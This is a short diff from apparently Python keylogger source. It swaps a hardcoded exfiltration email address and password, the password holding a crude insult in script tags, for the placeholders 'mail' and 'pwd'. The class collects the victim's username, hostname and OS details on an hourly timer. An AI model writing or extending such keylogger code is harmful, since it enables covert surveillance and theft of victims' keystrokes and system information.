@@ -28,8 +28,8 @@ class Keylogger:
     def __init__(self):
         # таймер sec
         self.interval = 3600
-        self.email = 'web.security.20@bk.ru'
-        self.password = '<script>you_pidor</script>'
+        self.email = 'mail'
+        self.password = 'pwd'
         self.username = getpass.getuser()
         self.hostname = socket.gethostname()
         self.os_info = platform.platform()
